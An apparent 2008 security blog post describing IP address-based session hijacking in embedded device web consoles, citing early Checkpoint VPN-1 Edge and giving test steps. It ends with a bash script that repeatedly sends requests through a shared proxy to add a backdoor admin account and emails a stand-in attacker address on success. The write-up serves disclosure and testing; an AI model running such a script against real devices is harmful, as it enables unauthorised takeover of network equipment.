---
title: Holes In Embedded Devices - IP-based session management
author: pagvac
date: Tue, 29 Jan 2008 10:39:22 GMT
template: post.jade
category: fucked
---

Devices that implement IP address-based session management follow the algorithm described by the pseudocode shown below:

    if (submitted username and submitted password) == (credentials on device config)
    then
        do white-list user's source IP address
    

    The implications are obvious: devices located in environments in which different users share the same proxy are vulnerable to administrative session hijacking attacks. Please note that this session hijacking attack has nothing to do with the classic TCP hijacking attack in which sequence numbers are predicted by the attacker. Therefore, attacking a device susceptible to a "IP address-based session management" vulnerability does not require the attacker to intercept/sniff the traffic between the victim admin user and the target device. Rather, this attack performs session hijacking at the _HTTP application layer_ by providing the piece of information that is used by the target device to "know" who has access to authenticated resources on the web console: a trusted source IP address in this case.

    As an example, let's consider a corporate environment in which hundreds of users share the same proxy while browsing the web. Now, let's imagine that the administrator of the vulnerable device never checked the _bypass proxy server for local addresses_ option on his/her web browser. In other words, the administrator usually configures the vulnerable device via a proxy which is used by everyone else in the network.

    The result is that any malicious user using the same proxy as the administrator of the target device, can gain full administrative access via the web console by simply adding the device's IP address on the browser's address bar. Of course this attack would be more realistic by automating the process of hijacking the admin session on the web console and performing a malicious/interesting operation. i.e: backdoor the device by adding a new administrative account.

    Early versions of Checkpoint VPN-1 Edge, suffer from this vulnerability. As any other webapp pentester I started analyzing HTTP requests after logging in to the web console of this appliance. I quickly realized that no session IDs had been assigned to my HTTP session, neither was my browser submitting my username and password via common methods such as HTTP basic authentication. There was nothing being sent by my browser that would tell the VPN-1 Edge appliance that I was supposed to have access to the administrative functionalities. This led me to suspect that the appliance was simply trusting my IP address while the session hadn't yet timed out. So I simply performed the following checks which in order to test the potential "IP address-based session management" vulnerability:

1.  Opened a completely different browser rather than a new tab or window of the same browser. i.e.: Opera rather than Firefox
2.  Entered the URL of an administrative menu (i.e.: `http://192.168.10.1/network_settings.cgi`) on Opera and checked if I had access to it

    > Note: in the previous example, both Firefox and Opera were connecting via the same proxy, thus submitting HTTP requests to the VPN-1 appliance from the same source IP address.

    Since the firewall kindly offered me all the administrative functionalities which allowed me to change settings, it was obvious that the device was vulnerable.

    However, at this point I needed to make sure that other IP addresses other than my current one could not access the admin features while the session was considered active (if this was possible the issue would be even more severe). Therefore I simply removed the proxy settings from my browser and tried accessing a URL that would return an administrative page on the device. Accessing the firewall's web console from a different IP address - in this case the one assigned to my workstation - did _not_ work. Therefore, it could be concluded that while the administrative session is considered active by the firewall (i.e.: has not timed out yet), the firewall simply trusts HTTP requests that come from the IP address that has been white-listed.

    Provided that the VPN-1 appliance had also trusted other source IP addresses, while the admin session was active, then the appliance would suffer from a binary state session management vulnerability which will be explained in my following post. Feel free to use the aforementioned test steps to test your appliance. I've seen several devices affected by this issue, so developers of embedded software and security researchers are recommended to add this vulnerability type to their security testing checklist!

    An aspect that is important to mention regarding "IP-based session management" holes is weather or not the affected device implements an idle session timeout period. In case a session timeout mechanism is implemented, the timeout period (i.e.: 10 minutes) matters a lot, as it defines the window of opportunity to launch a session hijacking attack.

    A possible technique that can be used to exploit short timeout periods consists of writing a script that attempts to perform a configuration change on the vulnerable device every X minutes, where X is smaller than the idle session timeout period of the vulnerable device.

    The following is a hypothetical bash script that would attempt to add a new account on the vulnerable device every 5 seconds:

    #!/bin/bash

    target="192.168.10.1";
    email="attacker@evil-domain.foo"

    while true
    do
        if curl -s -x sharedproxy.company.foo:3128 -d "operation=addaccount&usr=hax0r&pwd=s3cr3tP455" $target | grep "account added successfully" > /dev/null
        then
            // log successful pwnage!!
            mail $email -s "backdoor account added successfully"
            exit 1
        fi
        sleep 5
    done

_Enjoy playing with IP-based session hijacking attacks! As you can see they are trivial to launch once the attacker has enough details of the vulnerable device._
